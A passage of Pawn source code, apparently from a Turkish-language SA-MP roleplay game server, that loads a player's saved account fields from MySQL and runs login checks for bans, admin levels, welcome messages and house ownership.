					mysql_fetch_field_row(szReturn, "Donator", g_MySQLConnections[0]);
					PlayerInfo[extraid][pDonator] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Banned", g_MySQLConnections[0]);
					PlayerInfo[extraid][pBanned] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Permabanned", g_MySQLConnections[0]);
					PlayerInfo[extraid][pPermaBanned] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Disabled", g_MySQLConnections[0]);
					PlayerInfo[extraid][pDisabled] = strval(szReturn);

					mysql_fetch_field_row(PlayerInfo[extraid][pIP], "LastIP", g_MySQLConnections[0]);

					mysql_fetch_field_row(szReturn, "Registered", g_MySQLConnections[0]);
					PlayerInfo[extraid][pReg] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Tutorial", g_MySQLConnections[0]);
					PlayerInfo[extraid][pTut] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Sex", g_MySQLConnections[0]);
					PlayerInfo[extraid][pSex] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Age", g_MySQLConnections[0]);
					PlayerInfo[extraid][pAge] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Skin", g_MySQLConnections[0]);
					PlayerInfo[extraid][pSkin] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "PosX", g_MySQLConnections[0]);
					PlayerInfo[extraid][pPos_x] = floatstr(szReturn);
					SetPVarFloat(extraid, "realX", floatstr(szReturn));

					mysql_fetch_field_row(szReturn, "PosY", g_MySQLConnections[0]);
					PlayerInfo[extraid][pPos_y] = floatstr(szReturn);
					SetPVarFloat(extraid, "realY", floatstr(szReturn));

					mysql_fetch_field_row(szReturn, "PosZ", g_MySQLConnections[0]);
					PlayerInfo[extraid][pPos_z] = floatstr(szReturn);
					SetPVarFloat(extraid, "realZ", floatstr(szReturn));

					mysql_fetch_field_row(szReturn, "PosR", g_MySQLConnections[0]);
					PlayerInfo[extraid][pPos_r] = floatstr(szReturn);

					mysql_fetch_field_row(szReturn, "ConnectTime", g_MySQLConnections[0]);
					PlayerInfo[extraid][pConnectTime] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Respect", g_MySQLConnections[0]);
					PlayerInfo[extraid][pRespect] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "PhoneNumber", g_MySQLConnections[0]);
					PlayerInfo[extraid][pNumber] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Warnings", g_MySQLConnections[0]);
					PlayerInfo[extraid][pWarns] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Gang", g_MySQLConnections[0]);
					PlayerInfo[extraid][pGang] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Faction", g_MySQLConnections[0]);
					PlayerInfo[extraid][pFaction] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Leader", g_MySQLConnections[0]);
					PlayerInfo[extraid][pLeader] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Rank", g_MySQLConnections[0]);
					PlayerInfo[extraid][pRank] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Job", g_MySQLConnections[0]);
					PlayerInfo[extraid][pJob] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Job2", g_MySQLConnections[0]);
					PlayerInfo[extraid][pJob2] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "UpgradePoints", g_MySQLConnections[0]);
					PlayerInfo[extraid][gPupgrade] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "SpawnArmor", g_MySQLConnections[0]);
					PlayerInfo[extraid][pSarmor] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Cash", g_MySQLConnections[0]);
					PlayerInfo[extraid][pCash] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Bank", g_MySQLConnections[0]);
					PlayerInfo[extraid][pBank] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Insurance", g_MySQLConnections[0]);
					PlayerInfo[extraid][pInsurance] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Smslog", g_MySQLConnections[0]);
					PlayerInfo[extraid][pSmslog] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Crimes", g_MySQLConnections[0]);
					PlayerInfo[extraid][pCrimes] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Arrested", g_MySQLConnections[0]);
					PlayerInfo[extraid][pArrested] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "WantedLevel", g_MySQLConnections[0]);
					PlayerInfo[extraid][pWantedLevel] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Health", g_MySQLConnections[0]);
					PlayerInfo[extraid][pHealth] = floatstr(szReturn);

					mysql_fetch_field_row(szReturn, "Armor", g_MySQLConnections[0]);
					PlayerInfo[extraid][pArmor] = floatstr(szReturn);

					mysql_fetch_field_row(szReturn, "Pot", g_MySQLConnections[0]);
					PlayerInfo[extraid][pPot] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Crack", g_MySQLConnections[0]);
					PlayerInfo[extraid][pCrack] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Radio", g_MySQLConnections[0]);
					PlayerInfo[extraid][pRadio] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "RadioFreq", g_MySQLConnections[0]);
					PlayerInfo[extraid][pRadioFreq] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Phonebook", g_MySQLConnections[0]);
					PlayerInfo[extraid][pPhoneBook] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Dice", g_MySQLConnections[0]);
					PlayerInfo[extraid][pDice] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "CDPlayer", g_MySQLConnections[0]);
					PlayerInfo[extraid][pCDPlayer] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Materials", g_MySQLConnections[0]);
					PlayerInfo[extraid][pMats] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Rope", g_MySQLConnections[0]);
					PlayerInfo[extraid][pRope] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Cigars", g_MySQLConnections[0]);
					PlayerInfo[extraid][pCigar] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Sprunk", g_MySQLConnections[0]);
					PlayerInfo[extraid][pSprunk] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Spraycan", g_MySQLConnections[0]);
					PlayerInfo[extraid][pSpraycan] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "House", g_MySQLConnections[0]);
					PlayerInfo[extraid][pHouse] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "House2", g_MySQLConnections[0]);
					PlayerInfo[extraid][pHouse2] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Renting", g_MySQLConnections[0]);
					PlayerInfo[extraid][pRenting] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Interior", g_MySQLConnections[0]);
					PlayerInfo[extraid][pInt] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "VirtualWorld", g_MySQLConnections[0]);
					PlayerInfo[extraid][pVW] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Jailed", g_MySQLConnections[0]);
					PlayerInfo[extraid][pJailed] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "JailTime", g_MySQLConnections[0]);
					PlayerInfo[extraid][pJailTime] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Gun0", g_MySQLConnections[0]);
					PlayerInfo[extraid][pGuns][0] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Gun1", g_MySQLConnections[0]);
					PlayerInfo[extraid][pGuns][1] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Gun2", g_MySQLConnections[0]);
					PlayerInfo[extraid][pGuns][2] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Gun3", g_MySQLConnections[0]);
					PlayerInfo[extraid][pGuns][3] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Gun4", g_MySQLConnections[0]);
					PlayerInfo[extraid][pGuns][4] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Gun5", g_MySQLConnections[0]);
					PlayerInfo[extraid][pGuns][5] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Gun6", g_MySQLConnections[0]);
					PlayerInfo[extraid][pGuns][6] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Gun7", g_MySQLConnections[0]);
					PlayerInfo[extraid][pGuns][7] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Gun8", g_MySQLConnections[0]);
					PlayerInfo[extraid][pGuns][8] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Gun9", g_MySQLConnections[0]);
					PlayerInfo[extraid][pGuns][9] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Gun10", g_MySQLConnections[0]);
					PlayerInfo[extraid][pGuns][10] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Gun11", g_MySQLConnections[0]);
					PlayerInfo[extraid][pGuns][11] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Paycheck", g_MySQLConnections[0]);
					PlayerInfo[extraid][pPayCheck] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "PayReady", g_MySQLConnections[0]);
					PlayerInfo[extraid][pPayReady] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Hospital", g_MySQLConnections[0]);
					PlayerInfo[extraid][pHospital] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "DetSkill", g_MySQLConnections[0]);
					PlayerInfo[extraid][pDetSkill] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "LawSkill", g_MySQLConnections[0]);
					PlayerInfo[extraid][pLawSkill] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "SexSkill", g_MySQLConnections[0]);
					PlayerInfo[extraid][pSexSkill] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "DrugsSkill", g_MySQLConnections[0]);
					PlayerInfo[extraid][pDrugsSkill] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "SmugglerSkill", g_MySQLConnections[0]);
					PlayerInfo[extraid][pSmugSkill] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "ArmsSkill", g_MySQLConnections[0]);
					PlayerInfo[extraid][pArmsSkill] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "MechSkill", g_MySQLConnections[0]);
					PlayerInfo[extraid][pMechSkill] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "FishSkill", g_MySQLConnections[0]);
					PlayerInfo[extraid][pFishSkill] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "BoxSkill", g_MySQLConnections[0]);
					PlayerInfo[extraid][pBoxSkill] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "TruckSkill", g_MySQLConnections[0]);
					PlayerInfo[extraid][pTruckSkill] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "CarSkill", g_MySQLConnections[0]);
					PlayerInfo[extraid][pCarSkill] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "LawyerTime", g_MySQLConnections[0]);
					PlayerInfo[extraid][pLawyerTime] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "LawyerFreeTime", g_MySQLConnections[0]);
					PlayerInfo[extraid][pLawyerFreeTime] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "DrugsTime", g_MySQLConnections[0]);
					PlayerInfo[extraid][pDrugsTime] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "MechTime", g_MySQLConnections[0]);
					PlayerInfo[extraid][pMechTime] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "SexTime", g_MySQLConnections[0]);
					PlayerInfo[extraid][pSexTime] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "CarTime", g_MySQLConnections[0]);
					PlayerInfo[extraid][pCarTime] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Fishes", g_MySQLConnections[0]);
					PlayerInfo[extraid][pFishes] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "BiggestFish", g_MySQLConnections[0]);
					PlayerInfo[extraid][pBiggestFish] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "pWEXists", g_MySQLConnections[0]);
					PlayerInfo[extraid][pWeedObject] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "pWX", g_MySQLConnections[0]);
					PlayerInfo[extraid][pWeedPos][0] = floatstr(szReturn);

					mysql_fetch_field_row(szReturn, "pWY", g_MySQLConnections[0]);
					PlayerInfo[extraid][pWeedPos][1] = floatstr(szReturn);

					mysql_fetch_field_row(szReturn, "pWZ", g_MySQLConnections[0]);
					PlayerInfo[extraid][pWeedPos][2] = floatstr(szReturn);

					mysql_fetch_field_row(szReturn, "pWVW", g_MySQLConnections[0]);
					PlayerInfo[extraid][pWeedVW] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "pWInt", g_MySQLConnections[0]);
					PlayerInfo[extraid][pWeedInt] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "pWValue", g_MySQLConnections[0]);
					PlayerInfo[extraid][pWeedGrowth] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "pWSeeds", g_MySQLConnections[0]);
					PlayerInfo[extraid][pWSeeds] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Wins", g_MySQLConnections[0]);
					PlayerInfo[extraid][pWins] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Loses", g_MySQLConnections[0]);
					PlayerInfo[extraid][pLoses] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "FightingStyle", g_MySQLConnections[0]);
					PlayerInfo[extraid][pFightStyle] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Screwdriver", g_MySQLConnections[0]);
					PlayerInfo[extraid][pScrewdriver] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Wristwatch", g_MySQLConnections[0]);
					PlayerInfo[extraid][pWristwatch] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Tire", g_MySQLConnections[0]);
					PlayerInfo[extraid][pTire] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Firstaid", g_MySQLConnections[0]);
					PlayerInfo[extraid][pFirstaid] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Rccam", g_MySQLConnections[0]);
					PlayerInfo[extraid][pRccam] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Receiver", g_MySQLConnections[0]);
					PlayerInfo[extraid][pReceiver] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "GPS", g_MySQLConnections[0]);
					PlayerInfo[extraid][pGPS] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Sweep", g_MySQLConnections[0]);
					PlayerInfo[extraid][pSweep] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "SweepLeft", g_MySQLConnections[0]);
					PlayerInfo[extraid][pSweepLeft] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Bugged", g_MySQLConnections[0]);
					PlayerInfo[extraid][pBugged] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "CarLic", g_MySQLConnections[0]);
					PlayerInfo[extraid][pCarLic] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "FlyLic", g_MySQLConnections[0]);
					PlayerInfo[extraid][pFlyLic] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "BoatLic", g_MySQLConnections[0]);
					PlayerInfo[extraid][pBoatLic] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "FishLic", g_MySQLConnections[0]);
					PlayerInfo[extraid][pFishLic] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "GunLic", g_MySQLConnections[0]);
					PlayerInfo[extraid][pGunLic] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Division", g_MySQLConnections[0]);
					PlayerInfo[extraid][pDivision] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "TicketTime", g_MySQLConnections[0]);
					PlayerInfo[extraid][pTicketTime] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "HeadValue", g_MySQLConnections[0]);
					PlayerInfo[extraid][pHeadValue] = strval(szReturn);

					mysql_fetch_field_row(PlayerInfo[extraid][pContractBy], "ContractBy", g_MySQLConnections[0]);

		            mysql_fetch_field_row(PlayerInfo[extraid][pContractDetail], "ContractBy", g_MySQLConnections[0]);

					mysql_fetch_field_row(szReturn, "Bombs", g_MySQLConnections[0]);
					PlayerInfo[extraid][pBombs] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "CHits", g_MySQLConnections[0]);
					PlayerInfo[extraid][pCHits] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "FHits", g_MySQLConnections[0]);
					PlayerInfo[extraid][pFHits] = strval(szReturn);

					mysql_fetch_field_row(PlayerInfo[extraid][pPrisonedBy], "PrisonedBy", g_MySQLConnections[0]);

					mysql_fetch_field_row(PlayerInfo[extraid][pPrisonReason], "PrisonReason", g_MySQLConnections[0]);

					mysql_fetch_field_row(szReturn, "AcceptReport", g_MySQLConnections[0]);
					PlayerInfo[extraid][pAcceptReport] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "TrashReport", g_MySQLConnections[0]);
					PlayerInfo[extraid][pTrashReport] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Accent", g_MySQLConnections[0]);
					PlayerInfo[extraid][pAccent] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "NewMuted", g_MySQLConnections[0]);
					PlayerInfo[extraid][pNMute] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "NewMutedTotal", g_MySQLConnections[0]);
					PlayerInfo[extraid][pNMuteTotal] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "AdMuted", g_MySQLConnections[0]);
					PlayerInfo[extraid][pADMute] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "AdMutedTotal", g_MySQLConnections[0]);
					PlayerInfo[extraid][pADMuteTotal] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "ReportMuted", g_MySQLConnections[0]);
					PlayerInfo[extraid][pRMuted] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "ReportMutedTotal", g_MySQLConnections[0]);
					PlayerInfo[extraid][pRMutedTotal] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "ReportMutedTime", g_MySQLConnections[0]);
					PlayerInfo[extraid][pRMutedTime] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Speedo", g_MySQLConnections[0]);
					PlayerInfo[extraid][pSpeedo] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "GCMuted", g_MySQLConnections[0]);
					PlayerInfo[extraid][pGCMuted] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "GCMutedTime", g_MySQLConnections[0]);
					PlayerInfo[extraid][pGCMutedTime] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "CallsAccepted", g_MySQLConnections[0]);
					PlayerInfo[extraid][pCallsAccepted] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "PatientsDelivered", g_MySQLConnections[0]);
					PlayerInfo[extraid][pPatientsDelivered] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "TriageTime", g_MySQLConnections[0]);
					PlayerInfo[extraid][pTriageTime] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Married", g_MySQLConnections[0]);
					PlayerInfo[extraid][pMarried] = strval(szReturn);

					mysql_fetch_field_row(PlayerInfo[extraid][pMarriedTo], "MarriedTo", g_MySQLConnections[0]);

					mysql_fetch_field_row(szReturn, "OnDuty", g_MySQLConnections[0]);
					PlayerInfo[extraid][pDuty] = strval(szReturn);

					mysql_fetch_field_row(PlayerInfo[extraid][pFlag], "Flag", g_MySQLConnections[0]);

					mysql_fetch_field_row(PlayerInfo[extraid][pReferredBy], "ReferredBy", g_MySQLConnections[0]);

					mysql_fetch_field_row(szReturn, "ReferredBy", g_MySQLConnections[0]);
					PlayerInfo[extraid][pRefTokens] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "RefTokens", g_MySQLConnections[0]);
					PlayerInfo[extraid][pRefTokens] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "RefTokensOffline", g_MySQLConnections[0]);
					PlayerInfo[extraid][pRefTokensOffline] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Helper", g_MySQLConnections[0]);
					PlayerInfo[extraid][pHelper] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "GangMod", g_MySQLConnections[0]);
					PlayerInfo[extraid][pGangMod] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "LiveBanned", g_MySQLConnections[0]);
					PlayerInfo[extraid][pLiveBanned] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Gate1", g_MySQLConnections[0]);
					PlayerInfo[extraid][pGate1] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Gate2", g_MySQLConnections[0]);
					PlayerInfo[extraid][pGate2] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Gate3", g_MySQLConnections[0]);
					PlayerInfo[extraid][pGate3] = strval(szReturn);
					
					mysql_fetch_field_row(szReturn, "Emlak", g_MySQLConnections[0]);
					PlayerInfo[extraid][pEmlak] = strval(szReturn);

					mysql_fetch_field_row(szReturn, "Blindfold", g_MySQLConnections[0]);
					PlayerInfo[extraid][pBlindfold] = strval(szReturn);
					

					mysql_fetch_field_row(szReturn, "Gas", g_MySQLConnections[0]);
					PlayerInfo[extraid][pGas] = strval(szReturn);

					// Free the result (of the entire player record) when we're done with loading it...
					mysql_free_result(g_MySQLConnections[0]);

					if(PlayerInfo[extraid][pHospital] == 1) {
					    PlayerInfo[extraid][pHospital] = 0;
					    SetPVarInt(extraid, "DoktorMasrafi", 1);
					}

					TotalLogin++;
					GetPlayerIp(extraid, PlayerInfo[extraid][pIP], 16);
					if(PlayerInfo[extraid][pBanned] >= 1 || PlayerInfo[extraid][pPermaBanned] >= 1) {
						format(string, sizeof(string), "UYARI: %s (IP%s) banlý olduðu halde giriþ yapmayý denedi ve otomatik olarak banlandý.", GetPlayerNameEx(extraid), PlayerInfo[extraid][pIP]);
						ABroadCast(COLOR_YELLOW, string, 1);
						SendClientMessage(extraid, COLOR_CYAN, "Phoenix Role Play'den ban yedin, ban temyizi açmak için forum sitemizi ziyaret et.");
						AddBan(PlayerInfo[extraid][pIP]);
						Log("logs/ban.log", string);
						return Kick(extraid);
					}

					if(PlayerInfo[extraid][pSprunk] > 10) {
					    format(string, sizeof(string), "Çok fazla gazoz taþýyorsun. Artýk 10 kutu gazozun var ve $%d paran iade edildi.", PlayerInfo[extraid][pSprunk] - 10);
						SendClientMessage(extraid, COLOR_GREY, string);

						PlayerInfo[extraid][pCash] += PlayerInfo[extraid][pSprunk] - 10;
						PlayerInfo[extraid][pSprunk] = 10;
					}

					if(PlayerInfo[extraid][pSmslog] >= 1) {
					    format(string, sizeof(string), "SMS loglarý silindi ve %d materyalin geri verildi.", PlayerInfo[extraid][pSmslog] * 2000);
						SendClientMessage(extraid, COLOR_GREY, string);

                        PlayerInfo[extraid][pMats] += PlayerInfo[extraid][pSmslog] * 2000;
						PlayerInfo[extraid][pSmslog] = 0;
					}

			        if(PlayerInfo[extraid][pTut] == 1)
						PlayerPlaySound(extraid,SOUND_OFF,2050.1995, 1344.5500, 13.2378); //muzik Off

					SetSpawnInfo(extraid, 0, PlayerInfo[extraid][pSkin], PlayerInfo[extraid][pPos_x], PlayerInfo[extraid][pPos_y], PlayerInfo[extraid][pPos_z], 1.0, -1, -1, -1, -1, -1, -1);

					gPlayerLogged[extraid] = 1;
					SpawnPlayer(extraid);
					SetPlayerScore(extraid, PlayerInfo[extraid][pLevel]);

					if(PlayerInfo[extraid][pTut] == 1) {
					    TextDrawShowForPlayer(extraid, site);
						HideMainMenuGUI(extraid);
						InsideTut[extraid] = 0;
					}

					if(PlayerInfo[extraid][pDisabled] != 0) {
						format(string, sizeof(string), "{AA3333}AdminUyarýsý{FFFF00}: %s adlý oyuncu karakteri kullaným dýþý olduðundan dolayý otomatik olarak kicklendi.", GetPlayerNameEx(extraid));
				        ABroadCast(COLOR_YELLOW, string, 4);
					    SendClientMessage(extraid, COLOR_CYAN, "Bu karakter kullaným dýþý. Forum üzerinden bize ulaþýn.");
					    return Kick(extraid);
					}

					if(PlayerInfo[extraid][pAdmin] < 0 || PlayerInfo[extraid][pAdmin] > 10) {
			   			new name[MAX_PLAYER_NAME];
						GetPlayerName(extraid, name, sizeof(name));
						format(string, sizeof(string), "{AA3333}AdminUyarýsý{FFFF00}: %s, %d Level admin olarak giriþ yapmaya çalýþtý.", GetPlayerNameEx(extraid), PlayerInfo[extraid][pAdmin]);
						PlayerInfo[extraid][pAdmin] = 0;
				        ABroadCast(COLOR_YELLOW, string, 4);
						return Kick(extraid);
				    }

					if(PlayerInfo[extraid][pInt] > 0 || PlayerInfo[extraid][pVW] > 0) {
					    LoadObjectsForPlayer(extraid);
				    }

					SkinDelay(extraid);
					SetPlayerFightingStyle(extraid, PlayerInfo[extraid][pFightStyle]);
					SetPlayerToTeamColor(extraid);

					if(AdminLoggedInBefore[extraid] == 0) {
						if(PlayerInfo[extraid][pTut] == 1) {
							format(string, sizeof(string), "Phoenix Role Play'ye hoþgeldin, %s.", GetPlayerNameEx(extraid));
							SendClientMessage(extraid, COLOR_CYAN, string);
						}

						if(PlayerInfo[extraid][pAdmin] > 0 && PlayerInfo[extraid][pTut] == 1) {
							format(string, sizeof(string), "%d Level Admin olarak giriþ yaptýn.",PlayerInfo[extraid][pAdmin]);
							SendClientMessage(extraid, COLOR_WHITE,string);

							if(strlen(PlayerInfo[extraid][pAdminName]) > 2 && strlen(PlayerInfo[extraid][pAdminName]) < 20) {
								format(string, sizeof(string), "%s (%s) %d Level Admin olarak giriþ yaptý.", GetPlayerNameEx(extraid), PlayerInfo[extraid][pAdminName], PlayerInfo[extraid][pAdmin]);
							}
							else {
								format(string, sizeof(string), "%s (admin ismi ayarlanmamýþ) %d Level Admin olarak giriþ yaptý.", GetPlayerNameEx(extraid), PlayerInfo[extraid][pAdmin]);
							}

							foreach(Player, i) {
								if(PlayerInfo[i][pAdmin] >= 5 && PlayerInfo[i][pAdmin] >= PlayerInfo[extraid][pAdmin] && i != extraid) {
									SendClientMessage(i, COLOR_WHITE, string);
								}
							}
						}
						if(PlayerInfo[extraid][pTut] == 1) {
							format(string, sizeof(string), "~w~Hosgeldin~n~~y~%s", GetPlayerNameEx(extraid));
							GameTextForPlayer(extraid, string, 5000, 1);

							new motdstring[128];
							format(motdstring, sizeof(motdstring), "Haberler: %s", GlobalMOTD);
							SendClientMessage(extraid, COLOR_WHITE, motdstring);

							new amotdstring[128];
							format(amotdstring, sizeof(amotdstring), "Admin Haberleri: %s", AdminMOTD);
							if(PlayerInfo[extraid][pAdmin] > 0)  SendClientMessage(extraid, COLOR_YELLOW, amotdstring);
						}
						if(PlayerInfo[extraid][pGang] < 255 && PlayerInfo[extraid][pTut] == 1) {
							format(string, sizeof(string), "Aile Duyurusu: %s.", FamilyInfo[PlayerInfo[extraid][pGang]][FamilyMOTD]);
							SendClientMessage(extraid, COLOR_YELLOW, string);
						}
						if(!isnull(PlayerInfo[extraid][pFlag])) {
							format(string, sizeof(string), "%s adlý kiþide bayrak var.", GetPlayerNameEx(extraid));
							ABroadCast(COLOR_WHITE, string, 1);
				  		}
				  		if(PlayerInfo[extraid][pRefTokensOffline] != 0) {
				  		    format(string, sizeof(string), "Oyunda deðilken %d öneri jetonu kazandýn. Harcamak /refmarket yaz.", PlayerInfo[extraid][pRefTokensOffline]);
				  		    SendClientMessage(extraid, COLOR_YELLOW, string);
				  		    PlayerInfo[extraid][pRefTokens] += PlayerInfo[extraid][pRefTokensOffline];
				  		    PlayerInfo[extraid][pRefTokensOffline] = 0;
				  		}
			   			if(PlayerInfo[extraid][pJob2] >= 1 && PlayerInfo[extraid][pDonator] < 2 && PlayerInfo[extraid][pLevel] < 25) {
							PlayerInfo[extraid][pJob2] = 0;
							SendClientMessage(extraid, COLOR_YELLOW, "Ýkinci mesleðini 25 levelden düþük olduðundan yada VIP süren bittiðinden dolayý kaybettin.");
						}
					}

					/* --------- Load alternative player items (vehicles, toys, etc) --------- */
					LoadPlayerDynamicItems(extraid);
					/*format(szQuery, sizeof(szQuery), "UPDATE connections SET AccountID = %d WHERE playerid = %d", PlayerInfo[extraid][pID], extraid);
					mysql_query(szQuery, THREAD_NO_RESULT, extraid, g_MySQLConnections[0]);*/

					if(PlayerInfo[extraid][pWeedObject] != 0) {
						PlayerInfo[extraid][pWeedObject] = CreateDynamicObject(3409, PlayerInfo[extraid][pWeedPos][0], PlayerInfo[extraid][pWeedPos][1], PlayerInfo[extraid][pWeedPos][2], 0.0, 0.0, 0.0, PlayerInfo[extraid][pWeedVW], PlayerInfo[extraid][pWeedInt]);
					}

			 		new
						iCheckOne = INVALID_HOUSE_ID,
						iCheckTwo = INVALID_HOUSE_ID,
						szPlayerName[MAX_PLAYER_NAME];

					GetPlayerName(extraid, szPlayerName, sizeof(szPlayerName));

					for(new i = 0; i < MAX_HOUSES; ++i) if(strcmp(szPlayerName, HouseInfo[i][hOwner], false) == 0) {
						if(iCheckOne != INVALID_HOUSE_ID) iCheckTwo = i;
						else if(iCheckTwo == INVALID_HOUSE_ID) iCheckOne = i;
						else break;
					}

					if(iCheckOne != INVALID_HOUSE_ID)
						PlayerInfo[extraid][pHouse] = iCheckOne;
					else PlayerInfo[extraid][pHouse] = INVALID_HOUSE_ID;

					if(iCheckTwo != INVALID_HOUSE_ID)
						PlayerInfo[extraid][pHouse2] = iCheckTwo;
					else PlayerInfo[extraid][pHouse2] = INVALID_HOUSE_ID;

					if(PlayerInfo[extraid][pRenting] != INVALID_HOUSE_ID && (PlayerInfo[extraid][pHouse] != INVALID_HOUSE_ID || PlayerInfo[extraid][pHouse2] != INVALID_HOUSE_ID)) {
						PlayerInfo[extraid][pRenting] = INVALID_HOUSE_ID;
					}
				}
			} else mysql_free_result(g_MySQLConnections[0]); // The player logged off before we could get their result, so we need to free it.
		}
	}
	return 1;
}

forward Login(playerid);
public Login(playerid)
{
